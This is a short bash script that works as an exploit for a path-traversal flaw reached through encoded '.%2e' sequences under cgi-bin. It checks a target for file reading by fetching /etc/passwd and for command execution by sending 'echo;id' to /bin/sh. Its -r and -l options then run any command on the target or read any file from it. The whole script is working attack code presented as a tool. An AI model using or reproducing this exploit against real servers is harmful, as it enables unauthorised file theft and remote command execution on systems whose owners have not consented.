#!/bin/bash

optstring='h:cr:l:'

while getopts $optstring opt; do
  case $opt in
	h)
		host=$OPTARG
		;;
  esac
done

if [ -z "$host" ];then
	echo -e "\033[0;31m You must enter ip host"
	exit 1
fi

OPTIND=1

while getopts $optstring opt; do
  case $opt in
	c)
      echo "Check if target is vulnerable"
      echo ""
	  echo "Check for LFI attack"
	  result=$(curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd") 
	  if [[ $result == *"root:"* ]];then
		echo -e "$host \033[0;31m Vulnerable to LFI attack\n" 
	  else
		echo -e "$host \033[0;32m Not Vulnerable to LFI Attack\n"
	  fi

	  echo -e "\033[0;00mCheck for RCE attack"
	  
	  result=$(curl -d "echo;id" --insecure --silent "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh")
	  if [[ $result == *"uid="* ]];then
		echo -e "$host \033[0;31m Vulnerable to RCE attack\n" 
	  else
		echo -e "$host \033[0;32m Not Vulnerable to RCE Attack\n"
	  fi
	  ;;
    r)
	    echo "RCE Exploit : "
		echo "> $OPTARG"
		echo ""
		curl -d "echo;$OPTARG" --insecure --silent "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
      ;;
    l)
	    echo "LFI Exploit"
		curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/$OPTARG"
	  ;;
    \?)
      echo "Invalid option: -$OPTARG"
      ;;
  esac
done
